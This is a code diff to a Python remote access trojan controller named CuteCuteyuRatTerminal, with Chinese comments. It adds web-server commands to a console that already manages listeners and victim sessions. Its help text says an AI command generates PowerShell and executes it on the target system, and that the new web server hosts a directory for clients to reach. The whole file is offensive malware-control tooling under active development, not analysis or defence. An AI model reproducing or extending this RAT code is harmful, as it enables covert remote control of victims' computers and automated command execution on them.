@@ -8,6 +8,7 @@ import platform
 from tab_completer import TabCompleter, SessionState
 from session import Session
 import ps
+from webserver import WebServerManager
 
 
 class CuteCuteyuRatTerminal:
@@ -22,6 +23,9 @@ class CuteCuteyuRatTerminal:
         # 监听器管理 - 支持多个监听器
         self.listeners = {}  # {listener_id: {thread, host, port, is_running}}
         self.next_listener_id = 1
+        
+        # Web服务器管理（已移至webserver模块）
+        self.webserver_manager = WebServerManager()
         
         # 初始化Tab键自动补全
         self.tab_completer = TabCompleter()
@@ -215,6 +219,8 @@ class CuteCuteyuRatTerminal:
         print(f"[+] 监听器 {listener_id} 正在停止...")
         return True
     
+
+    
     def kill_session(self, session_id):
         """断开指定会话连接"""
         if session_id not in self.sessions:
@@ -348,6 +354,8 @@ class CuteCuteyuRatTerminal:
   session <id>            - 进入指定会话
   jobs                    - 显示所有监听器
   jobs -k <id>            - 停止指定监听器
+  webserver               - 启动Web服务器
+  webserver -k <id>       - 停止指定Web服务器
   stop                    - 停止所有监听器
   help                    - 显示此帮助信息
   exit                    - 退出程序
@@ -363,6 +371,7 @@ class CuteCuteyuRatTerminal:
   • 在session模式下，输入命令后按Tab键可补全会话命令
   • 在主界面下，输入部分命令后按Tab键可补全命令和参数
   • AI命令会调用AI生成PowerShell代码并在目标系统上执行
+  • Web服务器会在指定目录启动HTTP服务，便于客户端访问
         """
         print(help_text)
     
@@ -456,6 +465,25 @@ class CuteCuteyuRatTerminal:
                 self.stop_listener(listener_id)
             else:
                 print("[-] 用法: jobs -k <listener_id>")
+        
+        elif command.lower() == 'webservers':
+            self.webserver_manager.show_webservers()
+        
+        elif command.lower() == 'webserver':
+            # 启动Web服务器
+            webserver_id = self.webserver_manager.start_webserver()
+            if webserver_id:
+                print(f"[+] Web服务器 {webserver_id} 启动成功")
+            else:
+                print("[-] Web服务器启动失败")
+        
+        elif command.lower().startswith('webserver -k'):
+            parts = command.split()
+            if len(parts) == 3 and parts[1] == '-k' and parts[2].isdigit():
+                webserver_id = int(parts[2])
+                self.webserver_manager.stop_webserver(webserver_id)
+            else:
+                print("[-] 用法: webserver -k <webserver_id>")
         
         else:
             print(f"[-] 未知命令: {command}")
